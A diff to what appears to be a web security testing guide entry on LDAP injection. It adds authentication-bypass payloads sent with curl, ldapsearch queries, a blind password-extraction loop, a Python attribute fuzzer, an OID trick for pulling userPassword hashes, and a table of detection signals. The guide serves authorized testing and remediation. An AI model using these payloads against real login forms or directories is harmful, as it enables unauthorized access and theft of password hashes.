@@ -10,7 +10,9 @@ tech_stack: [ldap, activedirectory, openldap]
 cwe_ids: [CWE-90]
 chains_with: [wstg-athn-05, wstg-authz-02]
 prerequisites: [wstg-info-06]
-severity_boost: {}
+severity_boost:
+  wstg-athn-05: "LDAP filter injection (e.g. `*)(uid=*))(|(uid=*`) manipulates the bind/search filter to bypass authentication entirely without valid credentials = Critical (Full Authentication Bypass)"
+  wstg-authz-02: "LDAP Injection manipulates directory search filters to read or modify entries outside the caller's intended scope, exposing other users' attributes including password hashes = Critical (Directory-Wide Authorization Bypass)"
 ---
 
 # wstg-inpv-06
@@ -360,6 +362,69 @@ cn=admin,dc=example)(&(objectClass=*
 
 ---
 
+## Example Commands/Payloads
+
+### Auth Bypass (curl, web login form)
+
+```bash
+TARGET="https://target.com/login"
+
+curl -s -X POST "$TARGET" -d "username=*&password=x"
+curl -s -X POST "$TARGET" -d "username=admin)(&))&password=x"
+curl -s -X POST "$TARGET" -d "username=*)(uid=*))(|(uid=*&password=x"
+curl -s -X POST "$TARGET" -d "username=admin))(|(objectClass=*&password=x"
+```
+
+### Direct LDAP Query Testing (ldapsearch)
+
+```bash
+# Enumerate directory anonymously (if allowed)
+ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(uid=*)"
+
+# Simulate the app's injected filter directly against the directory
+ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(&(uid=*)(uid=*))(|(uid=*)(password=test))"
+
+# Blind attribute extraction, character by character
+for c in a b c d e f 0 1 2 3; do
+  ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(&(uid=admin)(password=${c}*))" | grep -q "numEntries: 1" && echo "[+] Next char: $c"
+done
+```
+
+### Field/Attribute Discovery (blind, fuzz a wordlist)
+
+```python
+# Discover which attribute names exist behind the injection point
+# Payload pattern: *)(ATTRIBUTE=*))\x00
+import requests
+url = "https://{target}/login"
+for attr in open('ldap-attributes.txt'):
+    attr = attr.strip()
+    r = requests.post(url, data={'login': f'*)({attr}=*))\x00', 'password': 'x'})
+    if 'TRUE CONDITION' in r.text or r.status_code == 200:
+        print(f"[+] Valid attribute: {attr}")
+# Common defaults to try: userPassword, sn, cn, mail, givenName, objectClass, uid
+```
+
+### userPassword Extraction via OCTET STRING Ordering-Match (OID 2.5.13.18)
+
+`userPassword` is stored as an OCTET STRING, not a normal string, so `>=`/`<=` comparisons can be abused byte-by-byte to extract the hash even when equality-based filters are blocked:
+
+```
+(userPassword:2.5.13.18:=\xx)      # single byte ordering comparison
+(userPassword:2.5.13.18:=\xx\xx)   # extend byte by byte until match
+```
+
+### Detection Pattern
+
+| Signal | Meaning |
+| ------ | ------- |
+| Login succeeds with `*` or `admin)(&))` as username with an arbitrary password | LDAP filter injection — authentication bypass confirmed |
+| Response/entry count changes based on injected wildcard boundary (`)(uid=*)`) | Confirms attacker-controlled filter closure — full query rewrite possible |
+| Application returns `LDAPException`, `javax.naming.directory.InvalidSearchFilterException`, or similar in error output | Verbose error confirms raw filter string built via concatenation |
+| Blind boolean extraction (`password=a*` vs `password=b*`) yields differing result counts | Character-by-character blind LDAP injection viable |
+
+---
+
 ## Remediation
 
 ```java
@@ -419,6 +484,7 @@ $filter = "(&(uid=$safe_username)(objectClass=user))";
 
 - [OWASP LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
 - [OWASP LDAP Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)
+- [PayloadsAllTheThings - LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)
 
 
 ---
